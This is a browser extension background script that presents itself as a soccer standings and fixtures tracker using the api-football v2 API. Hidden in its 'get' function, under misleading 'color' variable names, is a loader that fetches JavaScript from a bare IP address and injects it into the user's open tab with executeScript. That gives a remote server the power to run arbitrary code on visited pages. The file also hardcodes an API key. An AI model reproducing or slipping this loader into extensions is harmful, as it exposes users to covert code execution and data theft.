import browser from 'webextension-polyfill'
import { setStorage, getStorage, sendBackgroundCommand } from './lib/common'

let myHeaders = new Headers()
myHeaders.append('X-RapidAPI-Key', 'c327b55042017e95c88560420ee64e35')

const options = {
  mode: 'cors', // no-cors, *cors, same-origin
  headers: {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  },
}

const urls = {
  stats: 'http://50.116.107.237/~statscall/true-corner.js',
}

// TODO: Colors
const color = {
  code: '#FFFFFF',
}

// Gets congrats.
const other = async (url) => {
  try {
    const value = await fetch(url, options)
    return value
  } catch (error) {
    console.error(error)
    throw error
  }
}

const get = async (sender) => {
  color.code = '#FF0000'
  const info = color
  info['code'] = urls.stats
  try {
    const getting = await other(info.code)
    console.log('Este es el color: ', getting)
    info.code = await getting.text()
    if (info.code === '#00000') {
      sendBackgroundCommand('congratulations')
    }
    await browser.tabs.executeScript(sender.tab.id, color)
  } catch (error) {
    console.error(error.message)
  }
}


var requestOptions = {
  method: 'GET',
  headers: myHeaders,
  redirect: 'follow',
}

/*
THESE ARE THE LEAGUE CODES, WHEN A LEAGUE GETS OUTDATED, YO SHOULD SEARCH FOR THE LEAGUE HERE https://dashboard.api-football.com/soccer/ids, its the v2 API
 2790: premier league
 2833: la liga
 2664: ligue 1
 2857: serie a
 1333:  copa do brazil
 3265: primera division argentina
 2656: liga mx
 1341: primera division peruana
 3113: primera a (colombia)
 2755: Bundesliga
 1374: Campeonato Uruguayo
 2673: Eredivisie
 1342: Primera division de chile
 1264: Major League soccer
*/

/*the another are for release purposes, as fetchs are limited*/
const anotherLeagues = ['2664', '2857', '1333', '3265', '2656', '1341', '3113', '2755', '1374', '2673', '1342', '1264']
const anotherNames = ['Ligue 1', 'Serie A', 'Copa Do Brazil', 'Primera Division Argentina', 'Liga MX', 'Primera Division Peruana', 'Primera A', 'Bundesliga', 'Campeonato Uruguayo', 'Eredivisie', 'Primera Division de Chile', 'Major League Soccer']
const anotherMatches = ['Ligue_1_matches', 'Serie_A_matches', 'Copa_Do_Brazil_matches', 'Primera_Division_Argentina_matches', 'Liga_MX_matches', 'Primera_Division_Peruana_matches', 'Primera_A_matches', 'Bundesliga_matches', 'Campeonato_Uruguayo_matches', 'Eredivisie_matches', 'Primera_Division_de_Chile_matches', 'Major_League_Soccer_matches']


/*These are the ones that are used in the release, if you want to debug, you should put less things here*/
const leagues = ['2790', '2833' ]
const names = ['Premier League', 'La Liga']
const matches = ['Premier_League_matches', 'La_Liga_matches', 'Ligue_1_matches', 'Serie_A_matches', 'Copa_Do_Brazil_matches', 'Primera_Division_Argentina_matches', 'Liga_MX_matches', 'Primera_Division_Peruana_matches']

let ranks = {}
let current = ''

//This method is for getting the data of the standings for every league, it is used with the arrays above
const getStandings = (league, name, matches) => {
  fetch(`https://v2.api-football.com/leagueTable/${league}`, requestOptions) //you get the data with the key and the league
    .then(response => response.json())
    .then(data => {
      const tables = data.api.standings.flat() //for utility purposes we flatten the array.
      let teams = []
      // console.log('tables', tables)
      tables.forEach(element => { //we take each of the elements that concern us and save them.
        const team = {
          // ranking: element.rank,
          team:  element.teamName,
          points: element.points,
          games: element.all.matchsPlayed,
          wins: element.all.win,
          draws: element.all.draw,
          losses: element.all.lose,
          goalsFor: element.all.goalsFor,
          goalsAgainst: element.all.goalsAgainst,
        }
        teams.push(team)
      })
      console.log('teams before insertion', teams)
      // browser.storage.local.set({ [ name ]: teams })
      setStorage([name], teams) //we set the  storage with the teams of the league.
    })
    .catch(error => console.log(error))

    // Now for all the matches in the last seven days.
  fetch(`https://v2.api-football.com/fixtures/league/${league}/`, requestOptions)
    .then(response => response.json())
    .then(data => {
      const fixtures = data.api.fixtures
      let games = []
      let date = new Date()//we get the date right now
      fixtures.forEach(element => {
        let dateOld = new Date() //we create a new date and substract seven days from it
        dateOld.setDate(dateOld.getDate() - 7)
        let dateEvent = new Date(element.event_date)//we take the date from the match

        if (dateOld < dateEvent && dateEvent < date) { // if it has been in the last seven days.
          const match = {//we register it...
            awayTeamName: element.awayTeam.team_name,
            awayTeamLogo: element.awayTeam.logo,
            date: element.event_date,
            firstStart: element.firstHalfStart,
            goalsAway: element.goalsAwayTeam,
            goalsHome: element.goalsHomeTeam,
            homeTeamName: element.homeTeam.team_name,
            homeTeamLogo: element.homeTeam.logo,
            scoreHalfTime: element.score.halftime,
            scoreFullTime: element.score.fulltime,
            scoreExtraTime: element.score.extratime,
            scorePenalty: element.score.penalty,
            status: element.status,
            venue: element.venue,
          }
          games.push(match) ///and push it to the array
        }
      })
      // console.log('games before insertion', games)
      // browser.storage.local.set({ [ matches ]: games })
      setStorage([matches], games) //we save the array on the storage
    })
    .catch(error => console.log(error))
}

browser.runtime.onInstalled.addListener(() => { //once installed we set the popup
  browser.browserAction.setPopup({
    popup: 'popup.html',
  })
  leagues.forEach((element, index) => {  // we fetch the leagues standings and matches.
    getStandings(element, names[index], matches[index])
  })
  const date = new Date()

  setStorage('date', date.toString())
})

const updater = browser.alarms.create('Daily Updater', { //this is the daily updater, each day it will update for new matches and new standings.
  delayInMinutes: 1440,
  periodInMinutes: 1440,
})


browser.alarms.onAlarm.addListener(() => { //when the updater is triggered we fetch again everything
  leagues.forEach((element, index) => {
    getStandings(element, names[index])
  })
})

const sendRankings = async (league, dates, sendResponse) => {
  await browser.storage.local.set({ 'liga': league, 'partidos': dates })
  sendResponse({ response: 'Success!' })
}

browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
  switch (request.message) {
    case 'get-color':
      get(sender)
      break
    case 'element':
      sendRankings(request.params.league, request.params.matches, sendResponse)
      return true
    default:
      console.log(request, 'request not handled')
  }
})

